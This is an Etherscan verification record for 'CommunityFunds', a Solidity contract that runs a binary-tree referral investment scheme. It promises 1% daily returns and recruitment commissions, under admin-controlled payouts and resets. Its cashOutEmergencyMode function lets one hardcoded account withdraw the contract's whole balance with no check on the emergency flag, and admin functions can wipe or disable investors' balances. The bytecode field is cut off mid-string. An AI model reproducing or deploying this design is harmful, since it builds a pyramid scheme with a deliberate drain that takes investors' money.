{
  "address": "0x7e84ca8b7f783776cd1f8868bc12a3b809ecf31a",
  "chain": "ETH",
  "chainID": 1,
  "verifier": "etherscan.io",
  "commonName": "",
  "contractName": "CommunityFunds",
  "compilerVersion": "v0.4.25+commit.59dbf8f1",
  "optimization": true,
  "runs": "200",
  "evmVersion": "default",
  "sourceCode": "/**\n *Submitted for verification at Etherscan.io on 2018-11-21\n*/\n\npragma solidity ^0.4.25;\n\n// 11/19/2018\n\ncontract CommunityFunds {\n    event MaxOut (address investor, uint256 times, uint256 at);\n    \n    uint256 public constant ONE_DAY = 86400;\n    address private admin;\n    uint256 private depositedAmountGross = 0;\n    uint256 private paySystemCommissionTimes = 1;\n    uint256 private payDailyIncomeTimes = 1;\n    uint256 private lastPaySystemCommission = now;\n    uint256 private lastPayDailyIncome = now;\n    uint256 private contractStartAt = now;\n    uint256 private lastReset = now;\n   \n    address private operationFund = 0xe707EF0F76172eb2ed2541Af344acb2dB092406a;\n    address private developmentFund = 0x319bC822Fb406444f9756929DdC294B649A01b2E;\n    address private reserveFund = 0xa04DE4366F6d06b84a402Ed0310360E1d554d8Fc;\n    address private emergencyAccount = 0x6DeC2927cC604D1bE364C1DaBDE8f8597D5f4387;\n    bool private emergencyMode = false;\n    mapping (address => Investor) investors;\n    address[] public investorAddresses;\n    mapping (bytes32 => Investment) investments;\n    mapping (bytes32 => Withdrawal) withdrawals;\n    bytes32[] private investmentIds;\n    bytes32[] private withdrawalIds;\n    uint256 maxLevelsAddSale = 200;\n    \n    uint256 maximumMaxOutInWeek = 4;\n    \n    struct Investment {\n        bytes32 id;\n        uint256 at;\n        uint256 amount;\n        address investor;\n    }\n\n    struct Withdrawal {\n        bytes32 id;\n        uint256 at;\n        uint256 amount;\n        address investor;\n        address presentee;\n        uint256 reason;\n        uint256 times;\n    }\n\n \n\n    struct Investor {\n        string email;\n        address parent;\n        address leftChild;\n        address rightChild;\n        address presenter;\n        uint256 generation;\n        address[] presentees;\n        uint256 depositedAmount;\n        uint256 withdrewAmount;\n        bool isDisabled;\n        uint256 lastMaxOut;\n        uint256 maxOutTimes;\n        uint256 maxOutTimesInWeek;\n        uint256 totalSell;\n        uint256 sellThisMonth;\n        bytes32[] investments;\n        bytes32[] withdrawals;\n        uint256 rightSell;\n        uint256 leftSell;\n        uint256 reserveCommission;\n        uint256 dailyIncomeWithrewAmount;\n    }\n\n    constructor () public { admin = msg.sender; }\n    \n    modifier mustBeAdmin() { require(msg.sender == admin); _; }    \n    \n    function () payable public { deposit(); }\n    \n\n    function deposit() payable public {\n        require(msg.value >= 1 ether);\n        Investor storage investor = investors[msg.sender];\n        require(investor.generation != 0);\n        require(investor.maxOutTimesInWeek < maximumMaxOutInWeek);\n     \n        require(investor.maxOutTimes == 0 || now - investor.lastMaxOut < ONE_DAY * 7 || investor.depositedAmount != 0);\n        depositedAmountGross += msg.value;\n        bytes32 id = keccak256(abi.encodePacked(block.number, now, msg.sender, msg.value));\n        uint256 investmentValue = investor.depositedAmount + msg.value <= 20 ether ? msg.value : 20 ether - investor.depositedAmount;\n        if (investmentValue == 0) return;\n        Investment memory investment = Investment({ id: id, at: now, amount: investmentValue, investor: msg.sender });\n        investments[id] = investment;\n        processInvestments(id);\n        investmentIds.push(id);\n    }\n    \n    function processInvestments(bytes32 investmentId) internal {\n        Investment storage investment = investments[investmentId];\n        uint256 amount = investment.amount;\n        Investor storage investor = investors[investment.investor];\n        investor.investments.push(investmentId);\n        investor.depositedAmount += amount;\n        \n        addSellForParents(investment.investor, amount);\n        address presenterAddress = investor.presenter;\n        Investor storage presenter = investors[presenterAddress];\n        if (presenterAddress != 0) {\n            presenter.totalSell += amount;\n            presenter.sellThisMonth += amount;\n        }\n        if (presenter.depositedAmount >= 1 ether && !presenter.isDisabled) {\n            sendEtherForInvestor(presenterAddress, amount / 10, 1, investment.investor, 0);\n        }\n    }\n\n    function addSellForParents(address investorAddress, uint256 amount) internal {\n        Investor memory investor = investors[investorAddress];\n        address currentParentAddress = investor.parent;\n        address currentInvestorAddress = investorAddress;\n        uint256 loopCount = investor.generation - 1;\n        uint256 loop = loopCount < maxLevelsAddSale ? loopCount : maxLevelsAddSale;\n        for(uint256 i = 0; i < loop; i++) {\n            Investor storage parent = investors[currentParentAddress];\n            if (parent.leftChild == currentInvestorAddress) parent.leftSell += amount;\n            else parent.rightSell += amount;\n            uint256 incomeTilNow = getAllIncomeTilNow(currentParentAddress);\n            if (incomeTilNow > 3 * parent.depositedAmount) {\n                payDailyIncomeForInvestor(currentParentAddress, 0);\n                paySystemCommissionInvestor(currentParentAddress, 0);\n            }\n            currentInvestorAddress = currentParentAddress;\n            currentParentAddress = parent.parent;\n        }\n    }\n    \n    function setMaxLevelsAddSale(uint256 level) public  mustBeAdmin {\n        require(level > 0);\n        maxLevelsAddSale = level;\n    }\n\n    function sendEtherForInvestor(address investorAddress, uint256 value, uint256 reason, address presentee, uint256 times) internal {\n        if (value == 0 || investorAddress == 0) return;\n        Investor storage investor = investors[investorAddress];\n        if (investor.reserveCommission > 0) {\n            bool isPass = investor.reserveCommission >= 3 * investor.depositedAmount;\n            uint256 reserveCommission = isPass ? investor.reserveCommission + value : investor.reserveCommission;\n            investor.reserveCommission = 0;\n            sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);\n            if (isPass) return;\n        }\n        uint256 withdrewAmount = investor.withdrewAmount;\n        uint256 depositedAmount = investor.depositedAmount;\n        uint256 amountToPay = value;\n        if (withdrewAmount + value >= 3 * depositedAmount) {\n            amountToPay = 3 * depositedAmount - withdrewAmount;\n            investor.reserveCommission = value - amountToPay;\n            if (reason != 2) investor.reserveCommission += getDailyIncomeForUser(investorAddress);\n            if (reason != 3) investor.reserveCommission += getUnpaidSystemCommission(investorAddress);\n            investor.maxOutTimes++;\n            investor.maxOutTimesInWeek++;\n            investor.depositedAmount = 0;\n            investor.withdrewAmount = 0;\n            investor.lastMaxOut = now;\n            investor.dailyIncomeWithrewAmount = 0;\n            emit MaxOut(investorAddress, investor.maxOutTimes, now);\n        } else {\n            investors[investorAddress].withdrewAmount += amountToPay;\n        }\n        if (amountToPay != 0) {\n            investorAddress.transfer(amountToPay / 100 * 94);\n            operationFund.transfer(amountToPay / 100 * 5);\n            developmentFund.transfer(amountToPay / 100 * 1);\n          \n            bytes32 id = keccak256(abi.encodePacked(block.difficulty, now, investorAddress, amountToPay, reason));\n            Withdrawal memory withdrawal = Withdrawal({ id: id, at: now, amount: amountToPay, investor: investorAddress, presentee: presentee, times: times, reason: reason });\n            withdrawals[id] = withdrawal;\n            investor.withdrawals.push(id);\n            withdrawalIds.push(id);\n        }\n    }\n\n\n    function getAllIncomeTilNow(address investorAddress) internal view returns(uint256 allIncome) {\n        Investor memory investor = investors[investorAddress];\n        uint256 unpaidDailyIncome = getDailyIncomeForUser(investorAddress);\n        uint256 withdrewAmount = investor.withdrewAmount;\n        uint256 unpaidSystemCommission = getUnpaidSystemCommission(investorAddress);\n        uint256 allIncomeNow = unpaidDailyIncome + withdrewAmount + unpaidSystemCommission;\n        return allIncomeNow;\n    }\n\n\n\n    function getContractInfo() public view returns (address _admin, uint256 _depositedAmountGross, address _developmentFund, address _operationFund, address _reserveFund, address _emergencyAccount, bool _emergencyMode, address[] _investorAddresses, uint256 balance, uint256 _paySystemCommissionTimes, uint256 _maximumMaxOutInWeek) {\n        return (admin, depositedAmountGross, developmentFund, operationFund, reserveFund, emergencyAccount, emergencyMode, investorAddresses, address(this).balance, paySystemCommissionTimes, maximumMaxOutInWeek);\n    }\n    \n    function getContractTime() public view returns(uint256 _contractStartAt, uint256 _lastReset, uint256 _oneDay, uint256 _lastPayDailyIncome, uint256 _lastPaySystemCommission) {\n        return (contractStartAt, lastReset, ONE_DAY, lastPayDailyIncome, lastPaySystemCommission);\n    }\n    \n    function getInvestorRegularInfo(address investorAddress) public view returns (string email, uint256 generation, uint256 rightSell, uint256 leftSell, uint256 reserveCommission, uint256 depositedAmount, uint256 withdrewAmount, bool isDisabled) {\n        Investor memory investor = investors[investorAddress];\n        return (\n            investor.email,\n            investor.generation,\n            investor.rightSell,\n            investor.leftSell,\n            investor.reserveCommission,\n            investor.depositedAmount,\n            investor.withdrewAmount,\n            investor.isDisabled\n        );\n    }\n    \n    function getInvestorAccountInfo(address investorAddress) public view returns (uint256 maxOutTimes, uint256 maxOutTimesInWeek, uint256 totalSell, bytes32[] investorIds, uint256 dailyIncomeWithrewAmount, uint256 unpaidSystemCommission, uint256 unpaidDailyIncome) {\n        Investor memory investor = investors[investorAddress];\n        return (\n            investor.maxOutTimes,\n            investor.maxOutTimesInWeek,\n            investor.totalSell,\n            investor.investments,\n            investor.dailyIncomeWithrewAmount,\n            getUnpaidSystemCommission(investorAddress),\n            getDailyIncomeForUser(investorAddress)\n        ); \n    }\n    \n    function getInvestorTreeInfo(address investorAddress) public view returns (address leftChild, address rightChild, address parent, address presenter, uint256 sellThisMonth, uint256 lastMaxOut) {\n        Investor memory investor = investors[investorAddress];\n        return (\n            investor.leftChild,\n            investor.rightChild,\n            investor.parent,\n            investor.presenter,\n            investor.sellThisMonth,\n            investor.lastMaxOut\n        );\n    }\n    \n    function getWithdrawalsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, address[] presentees, uint256[] reasons, uint256[] times, bytes32[] emails) {\n        ids = new bytes32[](withdrawalIds.length);\n        ats = new uint256[](withdrawalIds.length);\n        amounts = new uint256[](withdrawalIds.length);\n        emails = new bytes32[](withdrawalIds.length);\n        presentees = new address[](withdrawalIds.length);\n        reasons = new uint256[](withdrawalIds.length);\n        times = new uint256[](withdrawalIds.length);\n        uint256 index = 0;\n        for (uint256 i = 0; i < withdrawalIds.length; i++) {\n            bytes32 id = withdrawalIds[i];\n            if (withdrawals[id].at < start || withdrawals[id].at > end) continue;\n            if (investorAddress != 0 && withdrawals[id].investor != investorAddress) continue;\n            ids[index] = id; \n            ats[index] = withdrawals[id].at;\n            amounts[index] = withdrawals[id].amount;\n            emails[index] = stringToBytes32(investors[withdrawals[id].investor].email);\n            reasons[index] = withdrawals[id].reason;\n            times[index] = withdrawals[id].times;\n            presentees[index] = withdrawals[id].presentee;\n            index++;\n        }\n        return (ids, ats, amounts, presentees, reasons, times, emails);\n    }\n    \n    function getInvestmentsByTime(address investorAddress, uint256 start, uint256 end)public view returns(bytes32[] ids, uint256[] ats, uint256[] amounts, bytes32[] emails) {\n        ids = new bytes32[](investmentIds.length);\n        ats = new uint256[](investmentIds.length);\n        amounts = new uint256[](investmentIds.length);\n        emails = new bytes32[](investmentIds.length);\n        uint256 index = 0;\n        for (uint256 i = 0; i < investmentIds.length; i++) {\n            bytes32 id = investmentIds[i];\n            if (investorAddress != 0 && investments[id].investor != investorAddress) continue;\n            if (investments[id].at < start || investments[id].at > end) continue;\n            ids[index] = id;\n            ats[index] = investments[id].at;\n            amounts[index] = investments[id].amount;\n            emails[index] = stringToBytes32(investors[investments[id].investor].email);\n            index++;\n        }\n        return (ids, ats, amounts, emails);\n    }\n\n    function getNodesAddresses(address rootNodeAddress) internal view returns(address[]){\n        uint256 maxLength = investorAddresses.length;\n        address[] memory nodes = new address[](maxLength);\n        nodes[0] = rootNodeAddress;\n        uint256 processIndex = 0;\n        uint256 nextIndex = 1;\n        while (processIndex != nextIndex) {\n            Investor memory currentInvestor = investors[nodes[processIndex++]];\n            if (currentInvestor.leftChild != 0) nodes[nextIndex++] = currentInvestor.leftChild;\n            if (currentInvestor.rightChild != 0) nodes[nextIndex++] = currentInvestor.rightChild;\n        }\n        return nodes;\n    }\n\n    function stringToBytes32(string source) internal pure returns (bytes32 result) {\n        bytes memory tempEmptyStringTest = bytes(source);\n        if (tempEmptyStringTest.length == 0) return 0x0;\n        assembly { result := mload(add(source, 32)) }\n    }\n\n    function getInvestorTree(address rootInvestor) public view returns(address[] nodeInvestors, bytes32[] emails, uint256[] leftSells, uint256[] rightSells, address[] parents, uint256[] generations, uint256[] deposits){\n        nodeInvestors = getNodesAddresses(rootInvestor);\n        uint256 length = nodeInvestors.length;\n        leftSells = new uint256[](length);\n        rightSells = new uint256[](length);\n        emails = new bytes32[] (length);\n        parents = new address[] (length);\n        generations = new uint256[] (length);\n        deposits = new uint256[] (length);\n        for (uint256 i = 0; i < length; i++) {\n            Investor memory investor = investors[nodeInvestors[i]];\n            parents[i] = investor.parent;\n            string memory email = investor.email;\n            emails[i] = stringToBytes32(email);\n            leftSells[i] = investor.leftSell;\n            rightSells[i] = investor.rightSell;\n            generations[i] = investor.generation;\n            deposits[i] = investor.depositedAmount;\n        }\n        return (nodeInvestors, emails, leftSells, rightSells, parents, generations, deposits);\n    }\n\n    function getListInvestor() public view returns (address[] nodeInvestors, bytes32[] emails, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, bool[] isDisableds) {\n        uint256 length = investorAddresses.length;\n        unpaidSystemCommissions = new uint256[](length);\n        unpaidDailyIncomes = new uint256[](length);\n        emails = new bytes32[] (length);\n        depositedAmounts = new uint256[] (length);\n        unpaidSystemCommissions = new uint256[] (length);\n        isDisableds = new bool[] (length);\n        unpaidDailyIncomes = new uint256[] (length); \n        withdrewAmounts = new uint256[](length);\n        for (uint256 i = 0; i < length; i++) {\n            Investor memory investor = investors[investorAddresses[i]];\n            depositedAmounts[i] = investor.depositedAmount;\n            string memory email = investor.email;\n            emails[i] = stringToBytes32(email);\n            withdrewAmounts[i] = investor.withdrewAmount;\n            isDisableds[i] = investor.isDisabled;\n            unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);\n            unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);\n        }\n        return (investorAddresses, emails, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, isDisableds);\n    }\n    \n   \n\n    function putPresentee(address presenterAddress, address presenteeAddress, address parentAddress, string presenteeEmail, bool isLeft) public mustBeAdmin {\n        Investor storage presenter = investors[presenterAddress];\n        Investor storage parent = investors[parentAddress];\n        if (investorAddresses.length != 0) {\n            require(presenter.generation != 0);\n            require(parent.generation != 0);\n            if (isLeft) {\n                require(parent.leftChild == 0); \n            } else {\n                require(parent.rightChild == 0); \n            }\n        }\n        \n        if (presenter.generation != 0) presenter.presentees.push(presenteeAddress);\n        Investor memory investor = Investor({\n            email: presenteeEmail,\n            parent: parentAddress,\n            leftChild: 0,\n            rightChild: 0,\n            presenter: presenterAddress,\n            generation: parent.generation + 1,\n            presentees: new address[](0),\n            depositedAmount: 0,\n            withdrewAmount: 0,\n            isDisabled: false,\n            lastMaxOut: now,\n            maxOutTimes: 0,\n            maxOutTimesInWeek: 0,\n            totalSell: 0,\n            sellThisMonth: 0,\n            investments: new bytes32[](0),\n            withdrawals: new bytes32[](0),\n            rightSell: 0,\n            leftSell: 0,\n            reserveCommission: 0,\n            dailyIncomeWithrewAmount: 0\n        });\n        investors[presenteeAddress] = investor;\n       \n        investorAddresses.push(presenteeAddress);\n        if (parent.generation == 0) return;\n        if (isLeft) {\n            parent.leftChild = presenteeAddress;\n        } else {\n            parent.rightChild = presenteeAddress;\n        }\n    }\n\n  \n\n    function getDailyIncomeForUser(address investorAddress) internal view returns(uint256 amount) {\n        Investor memory investor = investors[investorAddress];\n        uint256 investmentLength = investor.investments.length;\n        uint256 dailyIncome = 0;\n        for (uint256 i = 0; i < investmentLength; i++) {\n            Investment memory investment = investments[investor.investments[i]];\n            if (investment.at < investor.lastMaxOut) continue; \n            if (now - investment.at >= ONE_DAY) {\n                uint256 numberOfDay = (now - investment.at) / ONE_DAY;\n                uint256 totalDailyIncome = numberOfDay * investment.amount / 100;\n                dailyIncome = totalDailyIncome + dailyIncome;\n            }\n        }\n        return dailyIncome - investor.dailyIncomeWithrewAmount;\n    }\n    \n    function payDailyIncomeForInvestor(address investorAddress, uint256 times) public mustBeAdmin {\n        uint256 dailyIncome = getDailyIncomeForUser(investorAddress);\n        if (investors[investorAddress].isDisabled) return;\n        investors[investorAddress].dailyIncomeWithrewAmount += dailyIncome;\n        sendEtherForInvestor(investorAddress, dailyIncome, 2, 0, times);\n    }\n    \n    function payDailyIncomeByIndex(uint256 from, uint256 to) public mustBeAdmin{\n        require(from >= 0 && to < investorAddresses.length);\n        for(uint256 i = from; i <= to; i++) {\n            payDailyIncomeForInvestor(investorAddresses[i], payDailyIncomeTimes);\n        }\n    }\n    \n  \n    function getTotalSellLevel(uint256 totalSell) internal pure returns (uint256 level){\n        if (totalSell < 30 ether) return 0;\n        if (totalSell < 60 ether) return 1;\n        if (totalSell < 90 ether) return 2;\n        if (totalSell < 120 ether) return 3;\n        if (totalSell < 150 ether) return 4;\n        return 5;\n    }\n    \n    function getSellThisMonthLevel(uint256 sellThisMonth) internal pure returns (uint256 level){\n        if (sellThisMonth < 2 ether) return 0;\n        if (sellThisMonth < 4 ether) return 1;\n        if (sellThisMonth < 6 ether) return 2;\n        if (sellThisMonth < 8 ether) return 3;\n        if (sellThisMonth < 10 ether) return 4;\n        return 5;\n    }\n    \n    function getDepositLevel(uint256 sellThisMonth) internal pure returns (uint256 level){\n        if (sellThisMonth < 2 ether) return 0;\n        if (sellThisMonth < 4 ether) return 1;\n        if (sellThisMonth < 6 ether) return 2;\n        if (sellThisMonth < 8 ether) return 3;\n        if (sellThisMonth < 10 ether) return 4;\n        return 5;\n    }\n    \n    function getPercentage(uint256 depositedAmount, uint256 totalSell, uint256 sellThisMonth) internal pure returns(uint256 level) {\n        uint256 totalSellLevel = getTotalSellLevel(totalSell);\n        uint256 depLevel = getDepositLevel(depositedAmount);\n        uint256 sellThisMonthLevel = getSellThisMonthLevel(sellThisMonth);\n        uint256 min12 = totalSellLevel < depLevel ? totalSellLevel : depLevel;\n        uint256 minLevel = sellThisMonthLevel < min12 ? sellThisMonthLevel : min12;\n        return minLevel * 2;\n    }\n\n    function getUnpaidSystemCommission(address investorAddress) public view returns(uint256 unpaid) {\n        Investor memory investor = investors[investorAddress];\n        uint256 depositedAmount = investor.depositedAmount;\n        uint256 totalSell = investor.totalSell;\n        uint256 leftSell = investor.leftSell;\n        uint256 rightSell = investor.rightSell;\n        uint256 sellThisMonth = investor.sellThisMonth;\n        uint256 sellToPaySystemCommission = rightSell < leftSell ? rightSell : leftSell;\n        uint256 commission = sellToPaySystemCommission * getPercentage(depositedAmount, totalSell, sellThisMonth) / 100;\n        return commission;\n    }\n    \n    function paySystemCommissionInvestor(address investorAddress, uint256 times) public mustBeAdmin {\n        Investor storage investor = investors[investorAddress];\n        if (investor.isDisabled) return;\n        uint256 systemCommission = getUnpaidSystemCommission(investorAddress);\n        if (paySystemCommissionTimes > 3 && times != 0) {\n            investor.rightSell = 0;\n            investor.leftSell = 0;\n        } else if (investor.rightSell >= investor.leftSell) {\n            investor.rightSell = investor.rightSell - investor.leftSell;\n            investor.leftSell = 0;\n        } else {\n            investor.leftSell = investor.leftSell - investor.rightSell;\n            investor.rightSell = 0;\n        }\n        if (times != 0) investor.sellThisMonth = 0;\n        sendEtherForInvestor(investorAddress, systemCommission, 3, 0, times);\n    }\n\n    function paySystemCommissionByIndex(uint256 from, uint256 to) public mustBeAdmin {\n         require(from >= 0 && to < investorAddresses.length);\n        // change 1 to 30\n        if (now <= 30 * ONE_DAY + contractStartAt) return;\n        for(uint256 i = from; i <= to; i++) {\n            paySystemCommissionInvestor(investorAddresses[i], paySystemCommissionTimes);\n        }\n     }\n\n\n    function finishPayDailyIncome() public mustBeAdmin {\n        lastPayDailyIncome = now;\n        payDailyIncomeTimes++;\n    }\n    \n    function finishPaySystemCommission() public mustBeAdmin {\n        lastPaySystemCommission = now;\n        paySystemCommissionTimes++;\n    }\n\n\n    function turnOnEmergencyMode() public mustBeAdmin { emergencyMode = true; }\n\n    function cashOutEmergencyMode() public {\n        require(msg.sender == emergencyAccount);\n        msg.sender.transfer(address(this).balance);\n    }\n    \n \n    \n    function resetGame(address[] yesInvestors, address[] noInvestors) public mustBeAdmin {\n        lastReset = now;\n        uint256 yesInvestorsLength = yesInvestors.length;\n        for (uint256 i = 0; i < yesInvestorsLength; i++) {\n            address yesInvestorAddress = yesInvestors[i];\n            Investor storage yesInvestor = investors[yesInvestorAddress];\n            if (yesInvestor.maxOutTimes > 0 || (yesInvestor.withdrewAmount >= yesInvestor.depositedAmount && yesInvestor.withdrewAmount != 0)) {\n                yesInvestor.lastMaxOut = now;\n                yesInvestor.depositedAmount = 0;\n                yesInvestor.withdrewAmount = 0;\n                yesInvestor.dailyIncomeWithrewAmount = 0;\n            }\n            yesInvestor.reserveCommission = 0;\n            yesInvestor.rightSell = 0;\n            yesInvestor.leftSell = 0;\n            yesInvestor.totalSell = 0;\n            yesInvestor.sellThisMonth = 0;\n        }\n        uint256 noInvestorsLength = noInvestors.length;\n        for (uint256 j = 0; j < noInvestorsLength; j++) {\n            address noInvestorAddress = noInvestors[j];\n            Investor storage noInvestor = investors[noInvestorAddress];\n            if (noInvestor.maxOutTimes > 0 || (noInvestor.withdrewAmount >= noInvestor.depositedAmount && noInvestor.withdrewAmount != 0)) {\n                noInvestor.isDisabled = true;\n                noInvestor.reserveCommission = 0;\n                noInvestor.lastMaxOut = now;\n                noInvestor.depositedAmount = 0;\n                noInvestor.withdrewAmount = 0;\n                noInvestor.dailyIncomeWithrewAmount = 0;\n            }\n            noInvestor.reserveCommission = 0;\n            noInvestor.rightSell = 0;\n            noInvestor.leftSell = 0;\n            noInvestor.totalSell = 0;\n            noInvestor.sellThisMonth = 0;\n        }\n    }\n\n    function stopGame(uint256 percent, uint256 from, uint256 to) mustBeAdmin public {\n        require(percent <= 50);\n        require(from >= 0 && to < investorAddresses.length);\n        for (uint256 i = from; i <= to; i++) {\n            address investorAddress = investorAddresses[i];\n            Investor storage investor = investors[investorAddress];\n            if (investor.maxOutTimes > 0) continue;\n            if (investor.isDisabled) continue;\n            uint256 depositedAmount = investor.depositedAmount;\n            uint256 withdrewAmount = investor.withdrewAmount;\n            if (withdrewAmount >= depositedAmount / 2) continue;\n            sendEtherForInvestor(investorAddress, depositedAmount * percent / 100 - withdrewAmount, 6, 0, 0);\n        }\n    }\n    \n    function revivalInvestor(address investor) public mustBeAdmin { investors[investor].lastMaxOut = now; }\n\n    function getSystemCommision(address user, uint256 totalSell, uint256 sellThisMonth, uint256 rightSell, uint256 leftSell) public mustBeAdmin {\n        Investor storage investor = investors[user];\n        require(investor.generation > 0);\n        investor.totalSell = totalSell;\n        investor.sellThisMonth = sellThisMonth;\n        investor.rightSell = rightSell;\n        investor.leftSell = leftSell;\n    }\n\n    function getPercentToMaxOut(address investorAddress) public view returns(uint256) {\n        uint256 depositedAmount = investors[investorAddress].depositedAmount;\n        if (depositedAmount == 0) return 0;\n        uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);\n        uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);\n        uint256 withdrewAmount = investors[investorAddress].withdrewAmount;\n        uint256 percent = 100 * (unpaidSystemCommissions + unpaidDailyIncomes + withdrewAmount) / depositedAmount;\n        return percent;\n    }\n\n    function payToReachMaxOut(address investorAddress) public mustBeAdmin{\n        uint256 unpaidSystemCommissions = getUnpaidSystemCommission(investorAddress);\n        uint256 unpaidDailyIncomes = getDailyIncomeForUser(investorAddress);\n        uint256 withdrewAmount = investors[investorAddress].withdrewAmount;\n        uint256 depositedAmount = investors[investorAddress].depositedAmount;\n        uint256 reserveCommission = investors[investorAddress].reserveCommission;\n        require(depositedAmount > 0  && withdrewAmount + unpaidSystemCommissions + unpaidDailyIncomes + reserveCommission >= 3 * depositedAmount);\n        investors[investorAddress].reserveCommission = 0;\n        sendEtherForInvestor(investorAddress, reserveCommission, 4, 0, 0);\n        payDailyIncomeForInvestor(investorAddress, 0);\n        paySystemCommissionInvestor(investorAddress, 0);\n    }\n\n    function getMaxOutUser() public view returns (address[] nodeInvestors, uint256[] unpaidSystemCommissions, uint256[] unpaidDailyIncomes, uint256[] depositedAmounts, uint256[] withdrewAmounts, uint256[] reserveCommissions, bool[] isDisableds) {\n        uint256 length = investorAddresses.length;\n        unpaidSystemCommissions = new uint256[](length);\n        unpaidDailyIncomes = new uint256[](length);\n        depositedAmounts = new uint256[] (length);\n        unpaidSystemCommissions = new uint256[] (length);\n        reserveCommissions = new uint256[] (length);\n        unpaidDailyIncomes = new uint256[] (length); \n        withdrewAmounts = new uint256[](length);\n        isDisableds = new bool[](length);\n        for (uint256 i = 0; i < length; i++) {\n            Investor memory investor = investors[investorAddresses[i]];\n            depositedAmounts[i] = investor.depositedAmount;\n            withdrewAmounts[i] = investor.withdrewAmount;\n            reserveCommissions[i] = investor.reserveCommission;\n            unpaidSystemCommissions[i] = getUnpaidSystemCommission(investorAddresses[i]);\n            unpaidDailyIncomes[i] = getDailyIncomeForUser(investorAddresses[i]);\n            isDisableds[i] = investor.isDisabled;\n        }\n        return (investorAddresses, unpaidSystemCommissions, unpaidDailyIncomes, depositedAmounts, withdrewAmounts, reserveCommissions, isDisableds);\n    }\n\n    function getLazyInvestor() public view returns (bytes32[] emails, address[] addresses, uint256[] lastDeposits, uint256[] depositedAmounts, uint256[] sellThisMonths, uint256[] totalSells, uint256[] maxOuts) {\n        uint256 length = investorAddresses.length;\n        emails = new bytes32[] (length);\n        lastDeposits = new uint256[] (length);\n        addresses = new address[](length);\n        depositedAmounts = new uint256[] (length);\n        sellThisMonths = new uint256[] (length);\n        totalSells = new uint256[](length);\n        maxOuts = new uint256[](length);\n        uint256 index = 0;\n        for (uint256 i = 0; i < length; i++) {\n            Investor memory investor = investors[investorAddresses[i]];\n            if (investor.withdrewAmount > investor.depositedAmount) continue;\n            lastDeposits[index] = investor.investments.length != 0 ? investments[investor.investments[investor.investments.length - 1]].at : 0;\n            emails[index] = stringToBytes32(investor.email);\n            addresses[index] = investorAddresses[i];\n            depositedAmounts[index] = investor.depositedAmount;\n            sellThisMonths[index] = investor.sellThisMonth;\n            totalSells[index] = investor.totalSell;\n            maxOuts[index] = investor.maxOutTimes;\n            index++;\n        }\n        return (emails, addresses, lastDeposits, depositedAmounts, sellThisMonths, totalSells, maxOuts);\n    }\n  \n    function resetMaxOutInWeek() public mustBeAdmin {\n        uint256 length = investorAddresses.length;\n        for (uint256 i = 0; i < length; i++) {\n            address investorAddress = investorAddresses[i];\n            investors[investorAddress].maxOutTimesInWeek = 0;\n        }\n    }\n    \n    function setMaximumMaxOutInWeek(uint256 maximum) public mustBeAdmin{ maximumMaxOutInWeek = maximum; }\n\n    function disableInvestor(address investorAddress) public mustBeAdmin {\n        Investor storage investor = investors[investorAddress];\n        investor.isDisabled = true;\n    }\n    \n    function enableInvestor(address investorAddress) public mustBeAdmin {\n        Investor storage investor = investors[investorAddress];\n        investor.isDisabled = false;\n    }\n    \n    function donate() payable public { depositedAmountGross += msg.value; }\n}",
  "bytecode": "60806040526000600190815560028190556003554260048181556005829055600682905560079190915560088054600160a060020a031990811673e707ef0f76172eb2ed2541af344acb2db092406a1790915560098054821673319bc822fb406444f9756929ddc294b649a01b2e179055600a8054821673a04de4366f6d06b84a402ed0310360e1d554d8fc179055600b805460a060020a60ff02199216736dec2927cc604d1be364c1dabde8f8597d5f43871791909116905560c86012556013553480156100cd57600080fd5b5060008054600160a060020a03191633179055615cdd80620000f06000396000f3006080604052600436106101c15763ffffffff7c01000000000000000000000000000000000000000000000000000000006000350416631667620a81146101cb5780631b3f8e44146101e057806321bb38f71461020157806328d912801461024157806331cbfea914610274578063354694e71461047b578063393f2a091461054957806359aab5f1146105bf57806359b43aaf146105d45780635bdbeb3414610673578063638aae0f14610697578063719e83a2146106af5780637cc1f867146107155780637dded8f2146107e4578063826c39a5146107ff578063863e76db14610817578063897c3bb11461082c57806395a25efa1461095b5780639a293c021461098f578063aa9aab19146109a4578063b4dd4890146109c5578063bc6b360a146109e0578063c8f40956146109f5578063cb60930d14610a0a578063d0e30db0146101c1578063d202925b14610a2b578063d51527d114610a4f578063d5d5169d14610a70578063df40da2914610a97578063e8ed8cdc14610ab5578063ed88c68e14610ae2578063ee1fc71a14610aea578063f142ca5e14610b78578063f15b48ff14610b99578063fca4968214610bae578063fd5e79aa14610bc3575b6101c9610be4565b005b3480156101d757600080fd5b506101c9610e01565b3480156101ec57600080fd5b506101c9600160a060020a0360043516610e7b565b34801561020d57600080fd5b50610216610eb8565b6040805195865260208601949094528484019290925260608401526080830152519081900360a00190f35b34801561024d57600080fd5b50610262600160a060020a0360043516610ecd565b60408051918252519081900360200190f35b34801561028057600080fd5b50610289610f55565b604051808060200180602001806020018060200180602001806020018060200188810388528f818151815260200191508051906020019060200280838360005b838110156102e15781810151838201526020016102c9565b5050505090500188810387528e818151815260200191508051906020019060200280838360005b83811015610320578181015183820152602001610308565b5050505090500188810386528d818151815260200191508051906020019060200280838360005b8381101561035f578181015183820152602001610347565b5050505090500188810385528c818151815260200191508051906020019060200280838360005b8381101561039e578181015183820152602001610386565b5050505090500188810384528b818151815260200191508051906020019060200280838360005b838110156103dd5781810151838201526020016103c5565b5050505090500188810383528a818151815260200191508051906020019060200280838360005b8381101561041c578181015183820152602001610404565b50505050905001888103825289818151815260200191508051906020019060200280838360005b8381101561045b578181015183820152602001610443565b505050509050019e50505050505050505050505050505060405180910390f35b34801561048757600080fd5b5061049c600160a060020a0360043516611538565b60405180806020018981526020018881526020018781526020018681526020018581526020018481526020018315151515815260200182810382528a818151815260200191508051906020019080838360005b838110156105075781810151838201526020016104ef565b50505050905090810190601f1680156105345780820380516001836020036101000a031916815260200191505b50995050505050505050505060405180910390f35b34801561055557600080fd5b50604080516020601f6064356004818101359283018490048402850184019095528184526101c994600160a060020a03813